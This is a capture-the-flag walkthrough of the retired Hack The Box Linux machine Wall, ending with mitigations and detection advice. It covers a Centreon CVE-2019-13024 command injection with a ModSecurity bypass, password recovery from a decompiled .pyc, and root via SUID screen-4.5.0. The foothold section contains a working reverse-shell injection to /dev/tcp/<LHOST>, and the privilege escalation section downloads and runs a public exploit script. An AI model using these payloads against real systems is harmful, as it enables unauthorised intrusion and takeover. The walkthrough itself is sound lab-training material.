---
machine: Wall
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, centreon, cve-2019-13024, waf, modsecurity, pyc, screen, suid, privesc]
---

# Wall — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site only requires basic auth on `GET` requests; a `POST` to `/monitoring` still reaches `/centreon`, a Centreon 19.04 install vulnerable to CVE-2019-13024. The public exploit injects a command into `init_script` and runs it while generating configuration files, but a ModSecurity WAF blocks keywords, including the space character. The filter is identified and `${IFS}` replaces spaces to complete the injection and get a shell as `www-data`. A `.pyc` in a user's home is decompiled with `uncompyle6` and reveals `shelby`'s password. With either user, the SUID `screen-4.5.0` binary yields root.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 7.6p1 Ubuntu 4ubuntu0.3.
- `80` Apache httpd 2.4.29 (Ubuntu).
- The site is served as `wall.htb`.

```bash
feroxbuster -u http://wall.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

`/monitoring` and `/centreon` appear; `/monitoring` redirects to the Centreon install.

## Enumeration

`/monitoring` requires basic auth on `GET`. However, the Apache configuration applies the restriction only to that method: a `POST` to the same path passes without credentials and reaches `/centreon`.

```bash
curl -i http://wall.htb/monitoring
curl -i -X POST http://wall.htb/monitoring/
```

The Centreon page reports version `19.04`, within the range affected by CVE-2019-13024. The install has no default credentials.

## Foothold

The public Centreon exploit sends an `init_script` carrying the command and then calls `generateFiles.php`, which passes the value to `shell_exec` unsanitized. The first attempt fails because ModSecurity blocks the request.

The filter is probed with harmless values and confirmed to block spaces and several keywords. The bypass replaces spaces with the `${IFS}` variable:

```bash
curl -s -X POST "http://wall.htb/centreon/main.get.php?p=60901" \
  --data-urlencode "name=myNagios" \
  --data-urlencode "init_script=bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/<LHOST>/<LPORT>${IFS}0>&1'"
curl -s "http://wall.htb/centreon/include/configuration/configGenerate/xml/generateFiles.php?lang=en_US"
```

The shell is `www-data`'s.

## Lateral movement

The system has two users: `www-data` and `shelby`. `shelby`'s home holds a readable `.pyc` file. It is copied and decompiled:

```bash
uncompyle6 shelby.pyc
```

The code contains the password in clear text. It is used with `su shelby` or over SSH.

## Privilege escalation

`LinEnum` or a SUID search shows a non-standard binary:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/bin/screen-4.5.0` is SUID root. The version is vulnerable to CVE-2017-5618: `screen` writes a user-controlled log file and allows escalation. Public exploit 41154 compiles a library and a binary and loads them in root's context:

```bash
wget https://www.exploit-db.com/raw/41154 -O 41154.sh
bash 41154.sh
```

The script compiles `libhax.so` and `rootshell`, abuses `screen` to write `/etc/ld.so.preload` and runs the binary with privileges, returning a root shell.

## Evidence

- `/monitoring` with auth only on `GET` and `POST` accepted.
- Centreon 19.04 and CVE-2019-13024.
- Requests blocked by ModSecurity and the `${IFS}` bypass.
- Shell as `www-data`.
- `.pyc` decompiled with `shelby`'s password.
- SUID `screen-4.5.0` and a root shell.

## Lessons learned

- A per-method authentication rule leaves gaps in the other methods.
- A WAF does not remove the vulnerability, only changes payload encoding.
- `${IFS}` builds commands without spaces.
- A `.pyc` protects no secrets: it decompiles.
- SUID `screen` at an old version is a known escalation.

## Mitigations and detection

- Enforce authentication on every method and path, not only `GET`.
- Update Centreon and parameterize `init_script`; never pass it to `shell_exec`.
- Run ModSecurity in blocking mode with updated rules, but never as the only control.
- Keep `.pyc`, backups and code with credentials out of home directories.
- Drop SUID from binaries that do not need it; update `screen`.
- Alert on requests carrying `${IFS}`, `$()` and on `/etc/ld.so.preload` creation.

## References

- [0xdf — Wall](https://0xdf.gitlab.io/2019/12/07/htb-wall.html)
- [IppSec — Wall](https://www.youtube.com/watch?v=84xCsHvkxYE)
- [Hack The Box — Wall](https://app.hackthebox.com/machines/wall)
- [NVD — CVE-2019-13024](https://nvd.nist.gov/vuln/detail/CVE-2019-13024)
